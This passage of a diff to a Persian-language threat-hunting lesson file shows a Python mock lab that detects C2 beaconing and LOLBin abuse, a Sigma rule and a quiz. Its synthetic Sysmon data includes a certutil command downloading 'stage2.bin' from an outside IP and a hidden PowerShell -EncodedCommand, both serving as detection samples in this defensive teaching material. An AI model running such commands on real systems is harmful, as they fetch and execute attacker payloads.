+      "simple": "نبود لاگ یا حسگر لازم (مثل خاموش بودن Script Block Logging) که مانع تأیید یا رد یک فرضیه شکار می‌شود."
+    },
+    {
+      "term": "Detection Engineering",
+      "fa": "مهندسی قواعد تشخیص",
+      "simple": "تبدیل یافته‌های موفق Threat Hunting به قوانین خودکار، کم‌خطا و قابل آزمون در SIEM/EDR."
+    }
   ],
-  "semanticReview": {
-   "date": "2026-11-27",
-   "scope": "همه ۱۴ بخش، ۱۵ واژه، ۱۲ پرسش، SVG، پاک‌سازی کامل خطاهای نگارشی قدیمی و شبیه‌ساز محلی؛ بازبینی نویسنده نه مستقل",
-   "reviewer": "author-agent-self-review-not-independent",
-   "evidence": "academy-labs/reviews/spec_cyber_hunt-review-fa.md"
+  "stages": {
+    "lab": {
+      "title": "آزمایشگاه شبیه‌سازی محلی Python (کشف C2 Beaconing کم‌جیتر و شکار PowerShell/certutil LOLBins با نگاشت MITRE ATT&CK) — بدون SIEM یا بدافزار واقعی",
+      "executionStatus": "اسکریپت شبیه‌سازی محلی (Local Mock) با Python 3 روی تله‌متری مصنوعی اجرا و تست شده؛ هیچ SIEM/EDR یا بدافزار واقعی متصل یا اجرا نشده است.",
+      "html": "<p><strong>وضعیت اجرای آزمایشگاه:</strong> بخش اول یک <strong>شبیه‌سازی محلی (Local Mock) در Python 3</strong> است که در محیط Python 3 اجرا و با تست خودکار بررسی شده است؛ بخش دوم یک <strong>سناریوی مرجع طراحی‌شده (اجرا نشده روی تجهیز واقعی)</strong> است. هیچ SIEM/EDR واقعی، حسگر Zeek یا بدافزار زنده‌ای در این محیط اجرا یا متصل نشده است.</p><p>این شبیه‌ساز محلی دو الگوریتم واقعی شکار تهدید را روی تله‌متری مصنوعی اجرا می‌کند: (۱) محاسبه نسبت جیتر (<code>stdev / mean</code>) برای تفکیک <strong>C2 Beaconing</strong> منظم از ترافیک عادی کاربر، و (۲) شکار خط فرمان <strong>PowerShell EncodedCommand (T1059.001)</strong> و <strong>certutil LOLBin (T1105)</strong> درون رویدادهای Sysmon همراه با فیلتر فعالیت مشروع <code>robocopy</code>.</p><h4>بخش ۱: اجرای کد آزمایشگاه محلی</h4><p>پیش‌نیاز: Python 3.10+. کد زیر دقیقاً همان فایل <code>academy-labs/agent3/spec_cyber_hunt_lab.py</code> است؛ آن را با دستور زیر اجرا کنید:</p><pre dir=\"ltr\"><code>python3 01-خام-پروژه/academy-labs/agent3/spec_cyber_hunt_lab.py</code></pre><pre dir=\"ltr\"><code>#!/usr/bin/env python3\n&quot;&quot;&quot;\nLocal Mock Lab — spec_cyber_hunt (CyberOps Proactive Threat Hunting: MITRE ATT&amp;CK, C2 Beaconing &amp; LOLBins)\nSimulates hypothesis-driven threat hunting over synthetic Sysmon + DNS telemetry to detect:\n1) Periodic C2 HTTP/DNS beaconing (sorted inter-arrival CV with &gt;=4 observations minimum guard),\n2) Suspicious PowerShell encoded command + LOLBin (certutil) download,\n3) Mapping detections to MITRE ATT&amp;CK Tactics/Techniques while suppressing benign admin activity.\nNo real SIEM, EDR, Zeek sensor, or live malware is executed.\n&quot;&quot;&quot;\n\nimport json\nimport math\nimport statistics\n\n\ndef _require_finite_num(val: object, name: str) -&gt; float:\n    if isinstance(val, bool) or not isinstance(val, (int, float)):\n        raise ValueError(f&quot;{name} must be a finite number (not bool), got {val!r}&quot;)\n    try:\n        fval = float(val)\n    except OverflowError as exc:\n        raise ValueError(f&quot;{name} exceeds IEEE-754 finite float range: {val!r}&quot;) from exc\n    if not math.isfinite(fval):\n        raise ValueError(f&quot;{name} must be a finite number, got {val!r}&quot;)\n    return fval\n\n\ndef detect_beaconing(timestamps_sec: list[int], max_jitter_ratio: float = 0.08) -&gt; dict:\n    if not isinstance(timestamps_sec, (list, tuple)):\n        raise ValueError(f&quot;timestamps_sec must be a list/tuple of numbers, got {type(timestamps_sec).__name__}&quot;)\n    jitter_limit = _require_finite_num(max_jitter_ratio, &quot;max_jitter_ratio&quot;)\n    if jitter_limit &lt; 0:\n        raise ValueError(f&quot;max_jitter_ratio must be non-negative, got {jitter_limit!r}&quot;)\n    clean_ts = [_require_finite_num(t, f&quot;timestamps_sec[{i}]&quot;) for i, t in enumerate(timestamps_sec)]\n    if len(clean_ts) &lt; 4:\n        return {\n            &quot;intervals_sec&quot;: [],\n            &quot;mean_interval_sec&quot;: 0.0,\n            &quot;jitter_ratio&quot;: None,\n            &quot;beaconing_suspected&quot;: False,\n            &quot;reason&quot;: &quot;Need at least 4 observations to assess periodic beaconing&quot;,\n            &quot;mitre_attack&quot;: None,\n        }\n    ordered = sorted(clean_ts)\n    deltas = [b - a for a, b in zip(ordered, ordered[1:])]\n    if not all(math.isfinite(d) for d in deltas):\n        raise ValueError(&quot;inter-arrival timestamp deltas overflowed IEEE-754 finite float range&quot;)\n    try:\n        mean_d = statistics.mean(deltas)\n        stdev_d = statistics.pstdev(deltas)\n    except OverflowError as exc:\n        raise ValueError(&quot;inter-arrival statistics overflowed IEEE-754 finite float range&quot;) from exc\n    if not (math.isfinite(mean_d) and math.isfinite(stdev_d)):\n        raise ValueError(&quot;inter-arrival statistics produced non-finite float value&quot;)\n    if mean_d &lt;= 0:\n        return {\n            &quot;intervals_sec&quot;: deltas,\n            &quot;mean_interval_sec&quot;: 0.0,\n            &quot;jitter_ratio&quot;: None,\n            &quot;beaconing_suspected&quot;: False,\n            &quot;reason&quot;: &quot;Non-positive mean inter-arrival interval&quot;,\n            &quot;mitre_attack&quot;: None,\n        }\n    jitter_ratio_exact = stdev_d / mean_d\n    jitter_ratio = round(jitter_ratio_exact, 4)\n    suspected = jitter_ratio_exact &lt;= jitter_limit\n    return {\n        &quot;intervals_sec&quot;: deltas,\n        &quot;mean_interval_sec&quot;: round(mean_d, 2),\n        &quot;jitter_ratio&quot;: jitter_ratio,\n        &quot;beaconing_suspected&quot;: suspected,\n        &quot;mitre_attack&quot;: &quot;T1071.001 / TA0011 (Command and Control)&quot; if suspected else None,\n    }\n\n\ndef hunt_sysmon_events(events: list[dict]) -&gt; list[dict]:\n    if not isinstance(events, list):\n        raise ValueError(f&quot;events must be a list of dicts, got {type(events).__name__}&quot;)\n    findings = []\n    for ev in events:\n        if not isinstance(ev, dict):\n            raise ValueError(f&quot;each event must be a dict, got {type(ev).__name__}&quot;)\n        for key in (&quot;host&quot;, &quot;process&quot;, &quot;command_line&quot;):\n            if not isinstance(ev.get(key), str):\n                raise ValueError(f&quot;event[&#x27;{key}&#x27;] must be str, got {ev.get(key)!r}&quot;)\n        cmd = ev[&quot;command_line&quot;].lower()\n        if &quot;powershell&quot; in cmd and (&quot;-enc&quot; in cmd or &quot;-encodedcommand&quot; in cmd):\n            findings.append({\n                &quot;host&quot;: ev[&quot;host&quot;],\n                &quot;process&quot;: ev[&quot;process&quot;],\n                &quot;severity&quot;: &quot;HIGH&quot;,\n                &quot;hypothesis&quot;: &quot;Obfuscated PowerShell Execution&quot;,\n                &quot;mitre_tactic&quot;: &quot;TA0002 Execution&quot;,\n                &quot;mitre_technique&quot;: &quot;T1059.001 (PowerShell)&quot;,\n            })\n        elif &quot;certutil&quot; in cmd and &quot;-urlcache&quot; in cmd:\n            findings.append({\n                &quot;host&quot;: ev[&quot;host&quot;],\n                &quot;process&quot;: ev[&quot;process&quot;],\n                &quot;severity&quot;: &quot;HIGH&quot;,\n                &quot;hypothesis&quot;: &quot;LOLBin Ingress Tool Transfer via certutil&quot;,\n                &quot;mitre_tactic&quot;: &quot;TA0011 Command and Control&quot;,\n                &quot;mitre_technique&quot;: &quot;T1105 (Ingress Tool Transfer)&quot;,\n            })\n    return findings\n\n\ndef main() -&gt; None:\n    c2_beacon_times = [300, 0, 180, 60, 361, 121, 242]  # Intentionally unsorted raw log order\n    normal_browsing_times = [0, 14, 180, 195, 620, 625, 1100]\n    too_few_samples = [0, 60]\n    sysmon_logs = [\n        {&quot;host&quot;: &quot;WKSTN-FIN-09&quot;, &quot;process&quot;: &quot;powershell.exe&quot;, &quot;command_line&quot;: &quot;powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA...&quot;},\n        {&quot;host&quot;: &quot;WKSTN-FIN-09&quot;, &quot;process&quot;: &quot;certutil.exe&quot;, &quot;command_line&quot;: &quot;certutil.exe -urlcache -split -f http://198.51.100.77/stage2.bin&quot;},\n        {&quot;host&quot;: &quot;SRV-BACKUP-01&quot;, &quot;process&quot;: &quot;robocopy.exe&quot;, &quot;command_line&quot;: &quot;robocopy D:\\\\Data \\\\\\\\NAS01\\\\Backup /MIR&quot;},\n    ]\n    c2_res = detect_beaconing(c2_beacon_times)\n    benign_res = detect_beaconing(normal_browsing_times)\n    few_res = detect_beaconing(too_few_samples)\n    sysmon_hits = hunt_sysmon_events(sysmon_logs)\n\n    assert c2_res[&quot;beaconing_suspected&quot;] is True\n    assert benign_res[&quot;beaconing_suspected&quot;] is False\n    assert few_res[&quot;beaconing_suspected&quot;] is False\n    assert len(sysmon_hits) == 2\n\n    report = {\n        &quot;mode&quot;: &quot;LOCAL_MOCK_NO_REAL_SIEM_EDR_OR_MALWARE&quot;,\n        &quot;c2_beaconing_analysis&quot;: {\n            &quot;suspicious_host_10_10_40_19_unsorted_logs&quot;: c2_res,\n            &quot;benign_user_10_10_40_22&quot;: benign_res,\n            &quot;insufficient_samples_guard&quot;: few_res,\n        },\n        &quot;sysmon_lolbin_findings&quot;: sysmon_hits,\n        &quot;benign_events_filtered&quot;: len(sysmon_logs) - len(sysmon_hits),\n    }\n    print(json.dumps(report, indent=2, ensure_ascii=False))\n\n\nif __name__ == &quot;__main__&quot;:\n    main()\n</code></pre><p><strong>خروجی مورد انتظار:</strong> شناسایی <code>suspicious_host_10_10_40_19</code> با <code>jitter_ratio: 0.0223</code> (مشکوک به T1071.001)، دو یافته <code>HIGH</code> روی <code>WKSTN-FIN-09</code> و فیلتر ۱ رویداد مشروع بکاپ.</p><h4>بخش ۲: سناریوی مرجع طراحی‌شده (تجهیز واقعی اجرا نشده)</h4><p><strong>الگوی مرجع قانون Sigma برای شکار certutil LOLBin (اجرا نشده روی SIEM زنده):</strong></p><pre dir=\"ltr\"><code># Reference Sigma detection rule (NOT deployed to live SIEM)\ntitle: Suspicious Certutil URLCache Download (T1105)\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \"\\\\certutil.exe\"\n    CommandLine|contains|all: [\"-urlcache\", \"-f\"]\n  condition: selection\nlevel: high</code></pre><p><strong>مرز شواهد:</strong> اجرای کد محلی فقط بخش مدل‌شده/محلی را می‌آزماید و جایگزین آزمایش روی سخت‌افزار شبکه یا سامانه تولیدی نیست.</p>"
+    },
+    "quiz": {
+      "title": "آزمون درس شکار پیش‌فعال تهدید (Threat Hunting)، MITRE ATT&CK و LOLBins",
+      "instructions": "پاسخ هر ۱۲ پرسش را انتخاب کرده و توضیح فنی گزینه‌ها را بررسی کنید."
+    }
   },
-  "integration": {
-   "recommendedPath": "fam-specializations",
-   "recommendedCourse": "spec-cyberops",
-   "blueprint": "/academy-assets/v5/blueprints/spec_cyber_hunt.json",
-   "labScript": "01-خام-پروژه/academy-labs/agent3/spec_cyber_hunt_lab.py"
-  },
-  "technicalAuditFixes": [
-   "اصلاح بازبینی فاز ۵: مرتب‌سازی برچسب‌های زمانی ورودی و افزودن نگهبان حداقل ۴ مشاهده (len<4) و بررسی mean>0 در detect_beaconing فایل spec_cyber_hunt_lab.py برای جلوگیری از مثبت کاذب روی ۲ نمونه یا لاگ‌های نامرتب."
-  ]
- }
+  "interactiveQuiz": [
+    {
+      "title": "بنیادی‌ترین تفاوت شکار پیش‌فعال تهدید (Threat Hunting) با پایش واکنشی سنتی SOC (Alert Triage) چیست؟",
+      "options": [
+        "در Threat Hunting تیم منتظر آژیر SIEM نمی‌ماند، بلکه با ذهنیت Assume Breach و بر پایه فرضیه (Hypothesis) در داده‌های خام به دنبال TTPهای مهاجمان پنهان می‌گردد",
+        "Threat Hunting فقط روی فایروال انجام می‌شود",
+        "Threat Hunting نیازی به لاگ ندارد",
+        "پایش واکنشی سریع‌تر از صفر است"
+      ],
+      "correctIndex": 0,
+      "explanationHtml": "<p>شکار تهدید شکاف میان رخدادهای ناشناخته و قوانین موجود SIEM را پر می‌کند و خروجی آن قواعد تشخیص جدید است.</p>"
+    },
+    {
+      "title": "در هرم درد (Pyramid of Pain) دیوید بیانکو، شکار و مسدودسازی کدام لایه بیشترین هزینه و دردسر را به مهاجم تحمیل می‌کند؟",
+      "options": [
+        "هش فایل (MD5/SHA256)",
+        "آدرس IP سرور مهاجم",
+        "نام دامنه موقت",
+        "TTPs (تاکتیک‌ها، تکنیک‌ها و رویه‌های رفتاری مهاجم در قله هرم)"
+      ],
+      "correctIndex": 3,
+      "explanationHtml": "<p>تغییر هش یا IP برای مهاجم چند ثانیه طول می‌کشد، اما تغییر رفتار و TTPها کل ابزارسازی و عملیات مهاجم را بر هم می‌زند.</p>"
+    },
+    {
+      "title": "چگونه می‌توان ارتباط فرمان و کنترل (C2 Beaconing) یک بدافزار را حتی زمانی که ترافیک آن کاملاً با HTTPS رمزنگاری شده است، در لاگ‌های شبکه شناسایی کرد؟",
+      "options": [
+        "غیرممکن است و باید صبر کرد",
+        "با تحلیل آماری تناوب اتصال‌ها (فواصل منظم و نسبت جیتر بسیار پایین)، اثر انگشت TLS (JA3/JA4) و فراداده‌های Zeek/NetFlow",
+        "با خاموش کردن فایروال",
+        "با تغییر آدرس MAC کاربر"
+      ],
+      "correctIndex": 1,
+      "explanationHtml": "<p>فراداده زمانی و رفتاری (Low Jitter Ratio) یکی از قوی‌ترین سیگنال‌های کشف C2 Beaconing روی ترافیک رمزنگاری‌شده است.</p>"
+    },
+    {
+      "title": "منظور از تکنیک LOLBins (Living off the Land Binaries) که مهاجمان پیشرفته برای گریز از آنتی‌ویروس به کار می‌برند چیست؟",
+      "options": [
+        "نوشتن سیستم‌عامل جدید",
+        "حمله فیزیکی به سرور",
+        "سوءاستفاده از ابزارهای مشروع و امضاشده خود سیستم‌عامل (مانند PowerShell، certutil، mshta و WMI) برای دانلود یا اجرای کد مخرب",
+        "خاموش کردن کابل شبکه"
+      ],
+      "correctIndex": 2,
+      "explanationHtml": "<p>چون این فایل‌ها مشروع و متعلق به ویندوز هستند، آنتی‌ویروس مبتنی بر هش فایل آن‌ها را نمی‌گیرد و باید خط فرمان و درخت فرآیند را شکار کرد.</p>"
+    },
+    {
+      "title": "مشاهده اجرای فرآیند powershell.exe با پارامتر -EncodedCommand به عنوان فرزند مستقیم winword.exe در لاگ Sysmon Event ID 1 نشانه قوی چیست؟",
+      "options": [
+        "اجرای احتمالی ماکرو یا اکسپلویت مخرب درون سند Word (تکنیک MITRE ATT&CK T1059.001)",
+        "به‌روزرسانی عادی فونت ویندوز",
+        "اتصال طبیعی به چاپگر",
+        "تنظیم ساعت NTP"
+      ],
+      "correctIndex": 0,
+      "explanationHtml": "<p>رابطه غیرطبیعی والد-فرزند میان نرم‌افزارهای Office و مفسرهای خط فرمان یکی از طلایی‌ترین فرضیه‌های شکار تهدید است.</p>"
+    },
+    {
+      "title": "هدف گام چهارم چرخه Threat Hunting (تبدیل یک شکار موفق به قوانین Sigma / YARA و Playbookهای SIEM) چیست؟",
+      "options": [
+        "حذف کل تیم SOC",
+        "اتوماسیون کشف آن الگوی تهدید برای آینده (Detection Engineering) تا SIEM آن را فوری تشخیص دهد و شکارچی به سراغ فرضیه‌های جدید برود",
+        "ذخیره لاگ‌ها در فایل اکسل دستی",
+        "افزایش تعداد هشدارهای کاذب"
+      ],
+      "correctIndex": 1,
+      "explanationHtml": "<p>ارزش پایدار Threat Hunting در تبدیل دانش انسانی شکار به قواعد خودکار Sigma/YARA و ارتقای بلوغ SIEM است.</p>"
+    },
+    {
+      "title": "تکنیک آماری Long-Tail Analysis (Stacking) در شکار تهدید چگونه به کشف نفوذ در میان میلیون‌ها لاگ کمک می‌کند؟",
+      "options": [
+        "با حذف همه لاگ‌های سرور",
+        "با انتخاب پرتکرارترین فرآیندها",
+        "با گروه‌بندی و شمارش فراوانی رویدادها و تمرکز بر کم‌تکرارترین و غیرعادی‌ترین موارد (Outliers) که معمولاً فعالیت مهاجم در میان آن‌ها پنهان است",
+        "با مسدود کردن همه کاربران"
+      ],
+      "correctIndex": 2,
+      "explanationHtml": "<p>ترافیک عادی و اسکریپت‌های مدیریتی پرتکرارند؛ ابزار یا مسیر غیرعادی مهاجم معمولاً در دم بلند (کم‌تکرار) نمودار فراوانی ظاهر می‌شود.</p>"
+    },
+    {
+      "title": "کدام نشانه در لاگ‌های DNS (مانند Zeek dns.log) به شدت مشکوک به خروج مخفیانه داده از طریق DNS Tunneling است؟",
+      "options": [
+        "یک درخواست عادی برای google.com",
+        "پاسخ سریع از کش محلی",
+        "حذف پورت TCP 80",
+        "حجم غیرعادی درخواست‌های TXT/AAAA با زیردامنه‌های بسیار طولانی و آنتروپی بالا (رشته‌های تصادفی کدگذاری‌شده) به سمت یک دامنه ناشناس"
+      ],
+      "correctIndex": 3,
+      "explanationHtml": "<p>کدگذاری داده (Base32/Hex) درون برچسب‌های زیردامنه باعث افزایش شدید طول و آنتروپی نام‌های DNS می‌شود.</p>"
+    },
+    {
+      "title": "چرا یک عملیات شکار تهدید که هیچ مهاجم فعالی پیدا نکرده است، همچنان برای امنیت سازمان ارزشمند محسوب می‌شود؟",
+      "options": [
+        "زیرا شکاف‌های دید (Visibility Gaps مانند نبود Sysmon) را آشکار می‌کند، خط مبنا (Baseline) فعالیت عادی را می‌سازد و کیفیت لاگ‌ها را ارتقا می‌دهد",
+        "ارزشی ندارد و شکست محسوب می‌شود",
+        "باعث کاهش تعداد سرورها می‌شود",
+        "موجب حذف نیاز به بکاپ می‌شود"
+      ],
+      "correctIndex": 0,
+      "explanationHtml": "<p>کشف اینکه «اگر فردا مهاجمی از تکنیک X استفاده کند، ما اصلاً لاگ آن را نداریم» یکی از مهم‌ترین دستاوردهای Threat Hunting است.</p>"
+    },
+    {
+      "title": "در ماتریس MITRE ATT&CK، اجرای دستور certutil.exe -urlcache -split -f برای دانلود فایل مرحله دوم بدافزار از اینترنت به کدام تکنیک نگاشت می‌شود؟",
+      "options": [
+        "T1486 (Data Encrypted for Impact)",
+        "T1105 (Ingress Tool Transfer)",
+        "T1078 (Valid Accounts)",
+        "T1498 (Network Denial of Service)"
+      ],
+      "correctIndex": 1,
+      "explanationHtml": "<p>انتقال ابزار یا بدافزار مرحله بعدی از بیرون به داخل سیستم قربانی دقیقاً تکنیک <code>T1105</code> در تاکتیک Command and Control است.</p>"
+    },
+    {
+      "title": "نقش ابزار متن‌باز Zeek در زیرساخت شکار تهدید شبکه چیست؟",
+      "options": [
+        "پخش فایل‌های ویدیویی",
+        "رمزگشایی رمز عبور کاربران",
+        "تولید فراداده‌های ساختاریافته و غنی از ترافیک شبکه (conn، dns، http، ssl) با حجم بسیار کمتر از Full PCAP جهت تحلیل سریع شکارچیان",
+        "جایگزینی آنتی‌ویروس روی ویندوز"
+      ],
+      "correctIndex": 2,
+      "explanationHtml": "<p>Zeek پل میانی فوق‌العاده میان NetFlow ساده و PCAP سنگین است و منبع اصلی شکار در سطح شبکه محسوب می‌شود.</p>"
+    },
+    {
+      "title": "آزمایشگاه این درس چگونه اجرا شده است؟",
+      "options": [
+        "اجرای بدافزار Cobalt Strike روی شبکه زنده",
+        "اتصال به Splunk تولیدی سازمان",
+        "فقط متن نظری بدون کد",
+        "شبیه‌سازی محلی (Local Mock) در Python 3 روی تله‌متری مصنوعی برای تحلیل جیتر C2 Beaconing و شکار PowerShell/certutil LOLBins با نگاشت MITRE ATT&CK"
+      ],
+      "correctIndex": 3,
+      "explanationHtml": "<p>آزمایشگاه به‌صورت Local Mock در Python 3 روی داده‌های مصنوعی اجرا شده و هیچ SIEM یا بدافزار واقعی در آن نیست.</p>"
+    }
+  ],
+  "meta": {
+    "version": "reviewed.9",
+    "legacyId": "spec_cyber_hunt",
+    "sources": [
+      "https://attack.mitre.org/",
+      "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon"
+    ],
+    "limitations": [
+      "آزمایشگاه این درس یک Local Mock در Python 3 روی تله‌متری مصنوعی است و هیچ SIEM/EDR واقعی، حسگر Zeek یا بدافزار زنده‌ای متصل یا اجرا نشده است."
+    ],
+    "legacyAuditFixes": [
+      "اصلاح کامل غلط‌های املایی و به هم‌ریختگی‌های شدید نسخه قدیمی («تلgern»، «شوائع»، «تراک broadcast» و «diagnostic می‌شود») و بازنویسی کامل به ۱۴ بخش، ۱۵ واژه، ۱۲ پرسش، نمودار SVG، Pyramid of Pain، MITRE ATT&CK، Sigma/YARA و شبیه‌ساز C2 Beaconing/LOLBins."
+    ],
+    "semanticReview": {
+      "date": "2026-11-27",
+      "scope": "همه ۱۴ بخش، ۱۵ واژه، ۱۲ پرسش، SVG، پاک‌سازی کامل خطاهای نگارشی قدیمی و شبیه‌ساز محلی؛ بازبینی نویسنده نه مستقل",
+      "reviewer": "author-agent-self-review-not-independent",
+      "evidence": "academy-labs/reviews/spec_cyber_hunt-review-fa.md"
+    },
+    "integration": {
+      "recommendedPath": "fam-specializations",
+      "recommendedCourse": "spec-cyberops",
+      "blueprint": "/academy-assets/v5/blueprints/spec_cyber_hunt.json",
+      "labScript": "01-خام-پروژه/academy-labs/agent3/spec_cyber_hunt_lab.py"
+    },
+    "technicalAuditFixes": [
+      "اصلاح بازبینی فاز ۵: مرتب‌سازی برچسب‌های زمانی ورودی و افزودن نگهبان حداقل ۴ مشاهده (len<4) و بررسی mean>0 در detect_beaconing فایل spec_cyber_hunt_lab.py برای جلوگیری از مثبت کاذب روی ۲ نمونه یا لاگ‌های نامرتب."
+    ]
+  }
 }
